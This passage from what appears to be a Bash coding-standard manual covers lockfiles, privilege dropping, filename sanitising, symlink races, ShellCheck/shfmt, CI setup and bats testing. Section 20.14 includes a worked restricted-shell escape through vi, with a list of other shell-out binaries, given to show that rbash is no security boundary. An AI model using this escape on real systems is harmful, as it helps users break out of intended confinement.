- `cmd >| existing.txt` forces overwrite.
- Default off; turn on for safer scripts.
- Use for "exclusive create" semantics.

```bash
# scenario: canonical exclusive-create lockfile with PID writeback
acquire_lock() {
  local -- lockfile="$1"
  set -o noclobber
  if ! { printf '%d\n' "$$" >"$lockfile"; } 2>/dev/null; then
    set +o noclobber
    local -i existing_pid
    existing_pid=$(<"$lockfile")
    if kill -0 "$existing_pid" 2>/dev/null; then
      printf >&2 'lock held by pid %d\n' "$existing_pid"
      return 1
    fi
    printf >&2 'stale lock (pid %d gone) — recovering\n' "$existing_pid"
    rm -f -- "$lockfile"
    acquire_lock "$lockfile"
    return
  fi
  set +o noclobber
  trap 'rm -f -- "$lockfile"' EXIT
}

acquire_lock /run/myservice.lock || exit 1
```

The `>` under noclobber is atomic at the kernel level (open with
`O_CREAT|O_EXCL`); two simultaneous starters cannot both succeed. PID
writeback lets the second instance distinguish a live lock from a stale
one. The `EXIT` trap (BCS0603) ensures the lock is released on every exit
path including `set -e` aborts under `inherit_errexit`.

**See also**: §20.13 (symlink races), §16 (concurrency), BCS0603 (traps), BCS1006 (temporary files).

## 20.11 Privilege drop

A script that starts as root should retain root only for the operations
that demand it. Drop privileges as early as possible — ideally immediately
after the privileged setup phase — and re-acquire only via an audited
boundary (sudo callback or pre-arranged capability).

### Three tools, ranked

`sudo -u`, `runuser`, and `setpriv` cover the practical spectrum. Pick the
least-privileged tool that suffices.

| Tool      | Best for                          | Availability                    |
|-----------|-----------------------------------|---------------------------------|
| `sudo -u` | Simple "run as user X"            | Universal where sudo installed  |
| `runuser` | systemd hosts, no PAM noise       | systemd distros (most modern)   |
| `setpriv` | Capability/securebits/no-new-privs| util-linux 2.32+                |

### `setpriv` — capability-drop incantation

`setpriv` is the most precise. The canonical incantation for "run this
under user `nobody`, with no capabilities, with `no_new_privs` so even an
SUID binary inside cannot re-elevate" is three lines:

```bash
# scenario: drop to nobody for a network-facing subtask
declare -ri NOBODY_UID=$(id -u nobody)
declare -ri NOBODY_GID=$(id -g nobody)
setpriv \
  --reuid="$NOBODY_UID" --regid="$NOBODY_GID" \
  --clear-groups --no-new-privs \
  --inh-caps=-all --bounding-set=-all \
  -- /usr/local/libexec/fetch-feed --url "$URL"
```

Five things are happening: `--reuid`/`--regid` set both real and effective
ids (so the child cannot setuid back), `--clear-groups` removes
supplementary groups (a script's most-overlooked privilege carrier),
`--no-new-privs` makes future `execve` ignore SUID and file capabilities,
and `--inh-caps=-all --bounding-set=-all` empties both inheritable and
bounding capability sets. The `--` is critical: it terminates `setpriv`
options so the target command's argv is not reinterpreted.

### `sudo -u` — the simpler case

When the host has sudo and capabilities are not required, `sudo -u --`
suffices:

```bash
# scenario: subtask runs as build user, no env carry-over
sudo -u builduser -- /usr/local/bin/run-build "$JOB_ID"
```

The `--` after `-u <user>` separates sudo's options from the command's
argv. `sudo -E` (preserve environment) is almost always wrong in
privilege-drop contexts; let `env_reset` strip the parent's environment.

### Re-acquiring privilege

A long-running script that drops to `nobody` for fetch and elevates for
write must arrange the elevation path *before* the drop, since post-drop
no setuid path remains. Two patterns work:

```bash
# scenario: pre-arrange a sudo callback before dropping
sudo -n true || die 13 'cannot pre-authenticate sudo'
# … privileged setup …
do_unprivileged_work_and_emit_results
# back in privileged main:
sudo -n install -m 0644 -- "$results" /var/lib/myapp/state
```

The `sudo -n true` pre-authenticates without prompting, refreshing the
sudo timestamp. The post-work `sudo -n` succeeds without re-prompting if
the timestamp has not expired and the sudoers entry is `NOPASSWD`.

The alternative is a privileged supervisor that `fork+exec`s an
unprivileged child via `setpriv`/`sudo`, then receives results over a
pipe. The supervisor never drops; the child never elevates. This is the
shape of every well-designed network daemon.

### Auditing the boundary

Every privilege transition is a security event. Log the EUID before and
after:

```bash
# scenario: audit the transition
info "dropping to nobody (euid was $EUID)"
exec setpriv --reuid="$NOBODY_UID" --regid="$NOBODY_GID" \
             --clear-groups --no-new-privs -- "$0" --child "$@"
```

Using `exec` replaces the parent so there is no privileged process left
holding open file descriptors that a successful exploit on the child
could inherit.

**See also**: §20.8 SUID restrictions, §20.13 symlink races, BCS1001
SUID/SGID prohibition, BCS1007 environment scrubbing.

## 20.12 Sanitising filenames

A POSIX filename is any byte sequence excluding `/` and NUL — which means
any byte sequence including ANSI escapes, RTL overrides, embedded
newlines, and characters that `ls` cannot print. User-supplied filenames
must be sanitised before they meet a shell command, a log, or a
filesystem (BCS1005).

Two complementary operations: a sanitiser that constrains the byte set,
and `realpath --` canonicalisation that resolves the path inside a
permitted root.

### Sanitiser function

The sanitiser below takes an untrusted name and emits a clean basename on
stdout, or fails with exit 22 (BCS0602 invalid argument) if the input is
beyond repair. It strips control characters, refuses traversal
components, refuses leading dashes (would be parsed as an option), and
caps length at 255 bytes (the traditional `NAME_MAX`).

```bash
sanitise_name() {
  local -- raw=${1-}
  (( $# == 1 )) || { error 'sanitise_name: exactly one argument'; return 22; }

  # reject empty, NUL-bearing, traversal, and absolute paths up-front
  [[ -n $raw ]]            || { error 'empty name';                 return 22; }
  [[ $raw != *$'\0'* ]]    || { error 'NUL in name';                return 22; }
  [[ $raw != /* ]]         || { error 'absolute path rejected';     return 22; }
  [[ $raw != *..* ]]       || { error 'traversal component';        return 22; }

  # strip control bytes (0x00-0x1F, 0x7F); keep printable + UTF-8 high-bit
  local -- clean=${raw//[[:cntrl:]]/}
  # collapse runs of whitespace, trim leading/trailing
  clean=${clean//+( )/ }
  clean=${clean# }; clean=${clean% }
  # refuse leading dash so consumers don't mis-parse as option
  [[ $clean != -* ]]       || { error 'leading dash';               return 22; }
  # length cap — typical NAME_MAX
  (( ${#clean} > 0 && ${#clean} <= 255 )) \
                           || { error 'length out of range';        return 22; }
  printf '%s\n' "$clean"
}
```

The `${raw//[[:cntrl:]]/}` substitution is BCS-correct (BCS0207); it
removes every control byte without iteration. `+( )` requires `extglob`,
which the BCS strict-mode preamble (BCS0101) enables.

### `realpath --` canonicalisation

The sanitiser produces a clean basename; `realpath --` resolves it to an
absolute path with symlinks resolved and `..` components flattened. The
final containment check proves the resolved path stays inside the
permitted root, blocking the case where a sanitised name reaches a
symlink that escapes.

```bash
# scenario: prove that user-named file resides inside ASSET_ROOT
declare -r ASSET_ROOT=/srv/assets
read -r raw_name
clean=$(sanitise_name "$raw_name")  || die 22 'invalid name'
abs=$(realpath -- "$ASSET_ROOT/$clean") \
                                    || die 3 'asset not found'
[[ $abs == "$ASSET_ROOT"/* ]] \
  || die 22 "asset escapes root: ${clean@Q} → ${abs@Q}"
process -- "$abs"
```

The leading `--` in `realpath --` is essential: a sanitised-but-still-
dash-leading name (which sanitise_name rejects, but defence-in-depth)
would otherwise be parsed as an option. The trailing pattern `"$ASSET_ROOT"/*`
requires the prefix *and* a `/`, blocking `ASSET_ROOT_evil/`.

For untrusted *paths* (not just basenames), apply the sanitiser to each
component after splitting on `/`, then re-join. Most scripts do not need
to accept paths; insist on basenames where possible.

**See also**: §20.6 input validation, §20.13 symlink races, BCS1005
input sanitization, BCS0207 parameter expansion.

## 20.13 Symlink races

A symlink race exploits the window between the script's *check* of a path
(`[[ -f $f ]]`) and its *use* (`> $f`). An attacker who can `rename(2)`
or `symlink(2)` in any directory component substitutes a different
target; the privileged operation lands on the attacker's choice.

The single best mitigation is to *not name the path*. Create a fresh
private directory with `mktemp -d`, work inside it, and clean up via
trap. Predictable paths in `/tmp` (`/tmp/foo.$$`, `/tmp/$USER.lock`) are
exploitable on multi-user hosts (BCS1006).

### Canonical `mktemp -d` wrapper

The pattern is three lines and belongs at the top of every script that
writes temporary state:

```bash
# scenario: private workdir, deterministic cleanup, no race
declare -- WORKDIR
WORKDIR=$(mktemp -d -t "${SCRIPT_NAME}.XXXXXXXX")
trap 'rm -rf -- "$WORKDIR"' EXIT
cd -- "$WORKDIR"                    # ⇒ from here on, relative paths are safe

# … create files inside WORKDIR …
printf '%s\n' "$payload" > result.txt
process -- result.txt
```

What this buys: `mktemp -d` creates the directory atomically with mode
0700, owned by the invoking user, with a name an attacker cannot guess.
The trap fires on every exit path, including `set -e` aborts and signals
that the script has not blocked. `cd -- "$WORKDIR"` ensures subsequent
relative paths cannot be tricked by a writable cwd.

Three subtleties matter:

1. **Quote `$WORKDIR`** in the trap. The trap argument is re-evaluated at
   trap time; an unquoted `$WORKDIR` breaks if `mktemp -d` returned a
   path containing whitespace (rare on Linux, common on macOS).
2. **`rm -rf --`** terminates options so a pathological `WORKDIR` value
   cannot become a flag. The chance is low after `mktemp -d`, but the
   `--` is free.
3. **Trap once.** Re-installing the EXIT trap deeper in the script
   *replaces* the cleanup; concatenate via a wrapper trap function if
   multiple cleanups are needed (BCS0603).

### Operating on a path the script does *not* own

The wrapper above is sufficient for tempfiles. When the script must
operate on a path supplied by the caller — `[[ -f $f ]] && rm $f` style
— bash itself offers no race-free primitive. `O_NOFOLLOW` and the
`*at()` family (`openat`, `unlinkat`) are not exposed from the shell.

Two practical escape hatches:

```bash
# scenario: race-resistant write via a python3 helper opening with O_NOFOLLOW
python3 - "$f" "$payload" <<'PY'
import os, sys
fd = os.open(sys.argv[1], os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o600)
os.write(fd, sys.argv[2].encode())
os.close(fd)
PY
```

`O_NOFOLLOW` causes the open to fail with `ELOOP` if the final component
is a symlink; combined with `O_EXCL`, this refuses both pre-existing
files and substituted symlinks atomically. The same shape works in any
language with `os.open`/`open(2)` access — Perl, Python, a 20-line C
helper. Treat the helper as part of the script; ship it alongside.

The deletion-of-a-tree case has a similar caveat: `rm -rf -- "$dir"`
follows directory symlinks introduced mid-walk. Where symlinks are
plausible inside the target tree, prefer:

```bash
# scenario: symlink-aware tree deletion
find "$dir" -depth -xdev \( -type f -o -type l \) -delete
find "$dir" -depth -xdev -type d -empty -delete
```

`-xdev` refuses to cross filesystem boundaries (defends against a
substituted bind-mount); `-depth` ensures contents are removed before
the directory itself.

For the "predictable lockfile" pattern, `mktemp` plus a symlink-as-lock
gives atomicity (§20.10 covers `set -C` lockfiles).

**See also**: §20.10 noclobber, §20.12 sanitising filenames, BCS1006
temporary file handling, BCS0603 trap handling.

## 20.14 Restricted shell mode

`bash -r` or `bash --restricted` runs in restricted mode.

- Cannot `cd`.
- Cannot set or unset `SHELL`, `PATH`, `ENV`, `BASH_ENV`.
- Cannot specify command names containing `/`.
- Cannot redirect output to files.
- Cannot use `exec` to replace shell with another program.
- Use case: chrooted environment for limited users; not a security boundary on its own.
- Easy to escape if the user can run any unrestricted shell from inside.

```text
# scenario: worked rbash escape — anything that re-execs bash unrestrictedly wins
$ rbash
rbash$ cd /tmp                      # ⇒ rbash: cd: restricted
rbash$ ls /etc                      # ⇒ ok — read-only ops are unrestricted
rbash$ vi notes.txt                 # editor opens
:!bash                              # vi shell-out ⇒ unrestricted /bin/bash
$ id                                # ⇒ same uid; rbash bypassed
```

Any binary whitelisted on PATH that exposes a shell-out (vi, less, awk
`system()`, find `-exec`, perl, python, ssh `~C`, even `man` with
`MANPAGER`) is an escape. Likewise, any file that bash will source —
because `BASH_ENV` is locked, but if a startup file like `~/.bashrc` is
writable, the user edits it before invoking rbash.

**Treat rbash as a UI hint, not a security boundary.** Real confinement
needs `chroot`, `setuid` capability dropping (§20.11), namespaces, or
proper sandboxing (`bwrap`, `firejail`). Pair rbash with: a curated
read-only `$HOME`, a tightly-scoped PATH whose binaries cannot shell out,
and a non-interactive login shell.

**See also**: §20.8 (SUID restrictions), §20.11 (privilege drop), §20.01 (threat model).

# Part XXI — Static Analysis, Formatting, and Testing

*Bash without ShellCheck is Python without a linter. This Part documents the tooling stack: static analysis, formatting, compliance checking, testing, and CI integration.*

---

---

## 21.1 ShellCheck warnings

ShellCheck is the de facto bash static analyser.

- Invocation: `shellcheck -x script.bash`.
- `-x` follows `source` directives.
- Severity levels: error, warning, info, style.
- Each warning has a code (`SC2086`, `SC2155`, etc.) and a wiki page.
- Most-cited warnings: SC2086 (unquoted variable), SC2155 (declare and assign separately), SC2068 (use `"$@"` not `$@`), SC2250 (use braces).
- Gates: `shellcheck --severity=warning` for stricter CI.
- All BCS-compliant scripts must be ShellCheck-clean (BCS1201 hooks here).

```json
{
  "comments": [
    {
      "file": "script.bash",
      "line": 12,
      "column": 8,
      "level": "warning",
      "code": 2086,
      "message": "Double quote to prevent globbing and word splitting.",
      "fix": {
        "replacements": [
          { "line": 12, "column": 8, "endLine": 12, "endColumn": 12,
            "precedence": 1, "insertionPoint": "beforeStart", "replacement": "\"" },
          { "line": 12, "column": 12, "endLine": 12, "endColumn": 12,
            "precedence": 2, "insertionPoint": "afterEnd", "replacement": "\"" }
        ]
      }
    }
  ]
}
```

The `--format=json1` schema above is what `bcscheck -j` mirrors (§21.5).
Each comment carries a stable `code`, machine-readable `level`, and an
optional `fix` block that auto-fixers (`shellcheck -f diff`, `shfmt`,
editor plugins) can apply.

```yaml
# scenario: CI gate — fail the build on any warning-or-higher
- name: ShellCheck
  run: |
    shellcheck --severity=warning --shell=bash --external-sources \
      bin/*.bash lib/*.bash
```

`--severity=warning` rejects `error` and `warning` levels but allows
`info` / `style`; `--shell=bash` prevents accidental POSIX-mode analysis
of scripts without a `#!/bin/bash` shebang; `--external-sources` (alias
`-x`) lets ShellCheck cross files.

**See also**: §21.2 (directives), §21.3 (source-path), §21.5 (`bcscheck`), BCS1201 (formatting).

## 21.2 ShellCheck directives

Inline pragmas to suppress specific warnings with a stated reason.

```bash
# shellcheck disable=SC2034 reason: read by sourced library
local -- callback="$1"
```

- `# shellcheck disable=SCNNNN` — suppress for next command.
- Multiple codes: comma-separated.
- Always include `reason:`; suppression without justification is a code smell.
- Source-level: `# shellcheck shell=bash` for files without shebang.
- `# shellcheck source=path` for non-default sourcing.
- `# shellcheck disable=SCNNNN # comment` — also acceptable.

### Top-8 ShellCheck rule codes (most-cited)

| Code   | Severity | Summary |
|--------|----------|---------|
| SC2086 | warning  | Double-quote to prevent globbing and word splitting (`"$var"` not `$var`). |
| SC2068 | error    | Use `"$@"` not `$@` to preserve argv quoting. |
| SC2155 | warning  | Declare and assign separately to avoid masking exit codes (`local x; x=$(cmd)`). |
| SC2162 | info     | `read` without `-r` mangles backslashes — almost always a bug. |
| SC2164 | warning  | `cd` without an exit-on-fail check (`cd dir || exit`). |
| SC1091 | info     | Source not following — fix with `source=path` or `source-path=SCRIPTDIR` (§21.3). |
| SC2178 | error    | Variable was used as an array but is now assigned a string. |
| SC2207 | warning  | Prefer `mapfile`/`readarray` over `arr=( $(cmd) )`; the latter word-splits and globs. |

These eight account for the bulk of real-world bash bugs flagged by
ShellCheck; every BCS rule under §03 (Strings/Quoting) and §02
(Variables) corresponds to at least one of them.

```bash
# scenario: multi-code disable with reason
# shellcheck disable=SC2034,SC2155 reason: callback exported to sourced lib; rc captured separately
declare -gx callback="$1"
declare -- workdir="$(get_workdir)"
```

```bash
#!/usr/bin/env false
# shellcheck shell=bash
# scenario: file-level shell directive for a sourced library with no shebang

lib_helper() {
  printf 'lib v1\n'
}

```

`# shellcheck shell=bash` at file head pins ShellCheck to bash semantics
even when the file lacks an executable shebang — essential for libraries
sourced via `source lib.bash`.

**See also**: §21.1 (warnings), §21.3 (source-path), §21.5 (`bcscheck`), BCS0307 (anti-patterns).

## 21.3 Source-path management

Helping ShellCheck follow `source` statements.

- `# shellcheck source=lib/util.bash` — explicit relative path.
- `# shellcheck source-path=SCRIPTDIR source=util.bash` — relative to script directory.
- `# shellcheck source-path=/abs/path source=util.bash` — absolute.
- Required when path uses `$(dirname "$0")` or other dynamic resolution.
- Without it, ShellCheck reports SC1091 (file not following).

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

# --- Script metadata (BCS0103 canonical pattern) ---
#shellcheck disable=SC2155
declare -r SCRIPT_PATH="$(realpath -- "$0")"
declare -r SCRIPT_DIR="${SCRIPT_PATH%/*}"
declare -r SCRIPT_NAME="${SCRIPT_PATH##*/}"

# scenario: source a sibling library; tell ShellCheck to follow it
# shellcheck source-path=SCRIPTDIR source=lib/messaging.bash
source "$SCRIPT_DIR/lib/messaging.bash"

# shellcheck source-path=SCRIPTDIR source=lib/config.bash
source "$SCRIPT_DIR/lib/config.bash"

main() {
  info 'started'
}

main "$@"

```

`source-path=SCRIPTDIR` is the magic token: ShellCheck resolves the
sibling path relative to the script's own directory, matching the
runtime semantics of the `$SCRIPT_DIR/lib/…` pattern. The directive
lives on the line directly above each `source` statement and is scoped
to that one statement.

**See also**: §21.1 (warnings), §21.2 (directives), §10 (sourcing libraries), BCS0103 (script metadata).

## 21.4 `shfmt`

A bash formatter, analogous to `gofmt`.

- Invocation: `shfmt -d script.bash` (diff mode).
- `-i 2` — 2-space indentation (BCS1201).
- `-ci` — switch case indented.
- `-s` — simplify (e.g., remove redundant `$()`).
- `-bn` — binary operator at start of next line.
- `shfmt -w` — write changes (after review).
- Pre-commit integration: reject any commit with shfmt diffs.

```ini
# .editorconfig — flags for editor + shfmt invocation
[*.bash]
indent_style = space
indent_size = 2
end_of_line = lf
trim_trailing_whitespace = true
insert_final_newline = true

# Equivalent shfmt invocation (BCS canonical):
#   shfmt -i 2 -ci -bn -s -d script.bash
```

```yaml
# scenario: pre-commit hook rejecting unformatted bash
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/scop/pre-commit-shfmt
    rev: v3.7.0
    hooks:
      - id: shfmt
        args: ['-i', '2', '-ci', '-bn', '-s', '-d']
```

Run `pre-commit install` once; thereafter every `git commit` runs
`shfmt -d` and rejects on non-zero diff. Combine with the §21.6
shellcheck hook for full lint+format gating.

**See also**: §21.6 (pre-commit hooks), §21.7 (CI integration), BCS1201 (formatting).

## 21.5 `bcscheck`

LLM-backed BCS compliance checker.

- Invocation: `bcscheck script.bash`.
- Calls into a configured LLM (Claude, Ollama, OpenAI, Google, etc.) per `bcs check`.
- Slow (minutes per script).
- Catches BCS-specific patterns ShellCheck doesn't (option terminator `--`, function organisation, error-code conventions).
- Configuration: `~/.config/bcs/bcs.conf`.
- JSON output mode for CI parsing: `bcscheck -j`.
- Inline suppression: `#bcscheck disable=BCSdddd`.

```bash
# scenario: JSON-mode invocation suitable for CI
$ bcscheck -j -m balanced -e medium ./bin/myscript
{
  "source": "bcs",
  "meta": { "model": "claude-sonnet-4", "effort": "medium", "elapsed_ms": 47210 },
  "comments": [
    {
      "file": "./bin/myscript",
      "line": 42,
      "column": 1,
      "level": "error",
      "code": "BCS0101",
      "message": "Strict mode preamble missing 'set -euo pipefail'.",
      "fix": null
    },
    {
      "file": "./bin/myscript",
      "line": 88,
      "column": 3,
      "level": "warning",
      "code": "BCS0307",
      "message": "Avoid unquoted $1 in [[ … ]]; quote for empty-arg safety.",
      "fix": null
    }
  ]
}
```

The envelope mirrors `shellcheck --format=json1` (§21.1) so the same CI
parsers work for both tools. `level=error` exits non-zero; `level=warning`
exits zero but is still surfaced.

```bash
# scenario: inline suppression scoped to the next command/block
# bcscheck disable=BCS0307 reason: arg known non-empty after option-parser guard
[[ $1 == --version ]] && { printf '%s\n' "$VERSION"; exit 0; }
```

The `#bcscheck disable=` comment honours the same scope rules as
`# shellcheck disable=` — the next single command, function, or
`{ … }` block. Always include a `reason:` (BCS0307 hooks here).

**See also**: §21.1 (ShellCheck JSON), §21.2 (ShellCheck directives), BCS0101 (strict mode), BCS0307 (anti-patterns).

## 21.6 Pre-commit hooks

Pre-commit hooks fail a commit before it is recorded, which is cheaper
than fixing CI red later. The Python `pre-commit` framework
(<https://pre-commit.com>) is the de-facto standard: it pins each linter
to a known git revision, isolates them in their own venv or container,
and runs only on staged files by default. Install it once
(`pipx install pre-commit`) and configure per-repo via
`.pre-commit-config.yaml`.

A working configuration for a BCS-flavoured bash repo runs `shellcheck`,
`shfmt`, and `bcscheck` on every `*.bash`, `*.sh`, and shebang-bash
file:

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/koalaman/shellcheck-precommit
    rev: v0.10.0
    hooks:
      - id: shellcheck
        args: [--severity=warning, --external-sources]

  - repo: https://github.com/scop/pre-commit-shfmt
    rev: v3.8.0-1
    hooks:
      - id: shfmt
        args: [-i, '2', -ci, -bn, -sr, -d]   # 2-space indent, diff mode

  - repo: local
    hooks:
      - id: bcscheck
        name: BCS compliance
        entry: bcscheck
        language: system
        types: [shell]
        args: [-m, fast, -e, low]
        require_serial: true                 # LLM-backed: don't fan out
```

Activate the hook for the working tree once per clone:

```bash
# scenario: enable hooks for a freshly cloned repo
pre-commit install                   # installs the git hook
pre-commit run --all-files           # smoke-test against the entire tree
# ⇒ commits now fail until shellcheck, shfmt, and bcscheck all pass
```

Notes:

- The `local` repo entry assumes `bcscheck` is on `PATH`; on a CI
  runner you may need to install BCS first or pin a path
  (`entry: /opt/bcs/bin/bcscheck`).
- `types: [shell]` matches files via `pre-commit`'s identifier list,
  which catches shebang-bash files without `.sh` extensions; explicit
  `files: '\.bash$'` also works.
- `require_serial: true` matters for LLM-backed checkers — running ten
  in parallel will throttle or rate-limit the backend.
- Bypass with `git commit --no-verify` is intentionally inconvenient.
  Reserve it for hot-fix branches and mention the bypass in the commit
  body so reviewers know to re-run the hooks before merging.
- `pre-commit autoupdate` bumps each `rev:` to the latest tag; review
  the diff before committing the bump (BCS releases sometimes change
  default severity tiers).

For larger repos consider also wiring `pre-commit` into CI itself
(§21.7) — the same config drives both, so divergence between local and
CI is impossible.

### Stage-aware hooks

`pre-commit` runs hooks only on *staged* files by default — partial
adds (`git add -p`) skip unstaged hunks. To validate the full file
even when only part of it is staged, use the `pass_filenames: false`
escape hatch and let the hook glob the working tree itself:

```yaml
  - repo: local
    hooks:
      - id: bcscheck-fulltree
        name: BCS compliance (full tree)
        entry: bash -c 'bcscheck $(git ls-files "*.bash" "*.sh")'
        language: system
        pass_filenames: false
        stages: [pre-push]                 # only on push, not commit
```

Splitting fast hooks (`shellcheck`, `shfmt`) into the `pre-commit`
stage and slow LLM-backed hooks (`bcscheck`) into `pre-push` keeps the
inner loop tight while still gating the network round-trip before the
remote sees the change.

**See also**: §21.1 (ShellCheck), §21.4 (shfmt), §21.5 (bcscheck),
§21.7 (CI integration), `BCS Section 13` (env config / `bcs.conf`).

## 21.7 CI integration

CI runs the same linters as the pre-commit hook (§21.6), but on every
push and pull request, against the *committed* tree rather than the
staged diff. The contract is simple: any warning is a failure, and the
default branch is protected so unmergable failures cannot be merged.
Two recipes — GitHub Actions and GitLab CI — cover the vast majority
of real repositories.

### GitHub Actions

A single workflow file at `.github/workflows/lint.yml` runs on every
push and PR. ShellCheck and shfmt come from upstream actions;
`bcscheck` is invoked as a normal step after installing BCS:

```yaml
# .github/workflows/lint.yml
name: lint
on: [push, pull_request]

jobs:
  shellcheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ludeeus/action-shellcheck@2.0.0
        env:
          SHELLCHECK_OPTS: --severity=warning --external-sources
        with:
          severity: warning

  shfmt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: luizm/action-sh-checker@v0.9.0
        env:
          SHFMT_OPTS: '-i 2 -ci -bn -sr -d'

  bcscheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: install bcs
        run: |
          git clone --depth=1 https://github.com/Open-Technology-Foundation/bash-coding-standard.git /tmp/bcs
          sudo make -C /tmp/bcs install
      - name: run bcscheck
        env:
          BCS_MODEL: claude-code:fast
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
        run: |
          shopt -s globstar nullglob
          for f in **/*.bash **/*.sh; do
            bcscheck -e low "$f" || exit 1
          done
```

A few editorial points:

- Pin every action by SHA or tag (`@2.0.0`, not `@main`). Floating
  tags are an exfiltration risk and break reproducibility.
- Cache the `bcscheck` install in a separate job that publishes an
  artefact for the lint job; for small repos the inline `make install`
  is cheaper than the cache plumbing.
- `fail-fast` is on by default for matrix jobs and that's correct —
  the first ShellCheck failure should short-circuit the rest of the
  bash matrix.

### GitLab CI

The `.gitlab-ci.yml` equivalent uses GitLab's built-in image
mechanism — no marketplace actions, just a Docker image with the
tools pre-installed:

```yaml
# .gitlab-ci.yml
stages: [lint]

lint:bash:
  stage: lint
  image: koalaman/shellcheck-alpine:v0.10.0
  before_script:
    - apk add --no-cache bash make git curl
    - curl -fsSL https://github.com/mvdan/sh/releases/download/v3.8.0/shfmt_v3.8.0_linux_amd64 -o /usr/local/bin/shfmt
    - chmod +x /usr/local/bin/shfmt
  script:
    - shellcheck --severity=warning --external-sources $(git ls-files '*.bash' '*.sh')
    - shfmt -i 2 -ci -bn -sr -d $(git ls-files '*.bash' '*.sh')
  rules:
    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

Branch protection completes the loop: in GitHub, mark the lint job as
a *required status check*; in GitLab, set the protected branch to
require a successful pipeline before merge. With those rules in place
a commit that fails the lint cannot reach the default branch, even
with admin override.

### Operational tips

- Treat any warning as an error. Severity downgrades belong in the
  source (`# shellcheck disable=SC1234` with a justification — see
  §21.2), not in the workflow.
- Cache the binaries (`actions/cache`, GitLab `cache:`) so that
  shellcheck and shfmt are fetched once per week, not once per run.
- For LLM-backed `bcscheck`, gate on PR labels (`run-bcs`) or schedule
  it on a nightly job; running it on every push will burn credits and
  slow the queue.
- Mirror `pre-commit` and CI from the *same* config so a developer
  cannot pass locally and fail in CI (§21.6).
- Surface failures inline. GitHub Actions parses ShellCheck's
  `--format=gcc` output as annotations on the offending lines —
  pass `-f gcc` instead of the default tty format and the warnings
  show up directly on the PR diff.
- Separate fast and slow gates. Run ShellCheck and shfmt on every
  push (sub-second feedback), and gate `bcscheck` on a `run-bcs`
  label or a nightly schedule. The CI job should call the same
  `bcscheck -e low` invocation the pre-commit hook uses (§21.6) so
  results are reproducible across both.

**See also**: §21.1 (ShellCheck), §21.4 (shfmt), §21.5 (bcscheck),
§21.6 (pre-commit), Appendix L (exit codes).

## 21.8 bats-core

`bats-core` (<https://github.com/bats-core/bats-core>) is the standard
test framework for bash. It parses files with the `.bats` extension,
treats each `@test 'description' { ... }` block as one test case, and
runs them with TAP-compatible output. A test passes when the block
exits zero; failure is any non-zero exit, optionally annotated by
helper assertions from the companion `bats-assert` and `bats-support`
libraries (§21.10).

A complete, runnable test file looks like this — note the strict-mode
preamble belongs in the *script under test*, not the `.bats` file
(bats provides its own error handling):

```bash
#!/usr/bin/env bats
# tests/greet.bats — exercise bin/greet

setup_file() {
  # one-time setup for all tests in this file
  export FIXTURE_DIR
  FIXTURE_DIR="$(mktemp -d)"
  printf 'Alice\n' > "$FIXTURE_DIR/users.txt"
}

teardown_file() {
  rm -rf -- "$FIXTURE_DIR"
}

setup() {
  # runs before every test
  PATH="$BATS_TEST_DIRNAME/../bin:$PATH"
}

@test 'greet prints hello with default name' {
  run greet
  [ "$status" -eq 0 ]
  [ "$output" = 'Hello, world!' ]
}

@test 'greet -n NAME prints hello NAME' {
  run greet -n Alice
  [ "$status" -eq 0 ]
  [ "$output" = 'Hello, Alice!' ]
}

@test 'greet reads names from file' {
  run greet -f "$FIXTURE_DIR/users.txt"
  [ "$status" -eq 0 ]
  [ "${lines[0]}" = 'Hello, Alice!' ]
}

@test 'greet exits 22 on bad option' {
  run greet --no-such-flag
  [ "$status" -eq 22 ]
}
```

Run it from the project root:

```bash
# scenario: run a single test file with TAP output
bats tests/greet.bats
# ⇒  ✓ greet prints hello with default name
#    ✓ greet -n NAME prints hello NAME
#    ...
#    4 tests, 0 failures

# scenario: run an entire suite recursively, parallelised
bats -r --jobs 4 tests/
```

### Lifecycle

| Hook | Runs | Use for |
|------|------|---------|
| `setup_file` | once before any test in the file | expensive fixtures, mock daemons |
| `setup` | before each test | per-test PATH or env tweaks |
| `teardown` | after each test | undo per-test mutations |
| `teardown_file` | once after all tests in the file | tear down expensive fixtures |

`setup_file` runs in a *separate* shell from individual tests; export
anything tests must read (`export FIXTURE_DIR=...`) — plain assignment
will not survive (§21.9).

### `run` and the `$status` / `$output` / `$lines` variables

`run cmd args` invokes the command and *captures* its result rather
than letting it crash the test:

- `$status` — the exit code (always set, including 0)
- `$output` — combined stdout+stderr as a single string
- `$lines[]` — `$output` split on newline
- `$stderr`, `$stderr_lines` — only with `run --separate-stderr`
  (bats-core 1.5+)

Without `run`, a non-zero exit aborts the test on the failing line —
useful when you *want* the test to fail on any unexpected error, but
useless when the assertion is "exit 22 on bad option".

### Editorial conventions

- `.bats` files live under `tests/` and mirror the source layout.
- One file per script under test; one `@test` per behaviour.
- Mock external commands with PATH injection (§21.11), not by editing
  `$PATH` ad-hoc inside each test.
- For richer assertions (`assert_output --partial`, `assert_line -n 0`),
  load `bats-assert` in `setup_file` (§21.10).

**See also**: §21.9 (setup/teardown semantics), §21.10 (assertions),
§21.11 (mocking via PATH), §21.13 (coverage with kcov).

## 21.9 Bats setup and teardown

The lifecycle hooks.

- `setup_file` — once per file, before any test runs in that file.
- `setup` — before each test.
- `teardown` — after each test (even on failure).
- `teardown_file` — once per file, after all tests.
- Use `setup_file` for expensive shared state (database init, file generation).
- Use `setup` for per-test fixtures.
- Variables set in `setup` are visible in the test; cleared between tests.

```bash
#!/usr/bin/env bats

# scenario: setup_file vs setup — shared vs per-test state

setup_file() {
  # ⇒ runs ONCE per file. Use for expensive read-only fixtures.
  export FIXTURE_DIR
  FIXTURE_DIR="$(mktemp -d)"
  printf 'shared,data\n' >"$FIXTURE_DIR/dataset.csv"
  # build a 100MB test corpus, prime a database, etc.
}

teardown_file() {
  rm -rf -- "$FIXTURE_DIR"
}

setup() {
  # ⇒ runs before EVERY test. Use for per-test mutable state.
  TMP="$(mktemp -d)"
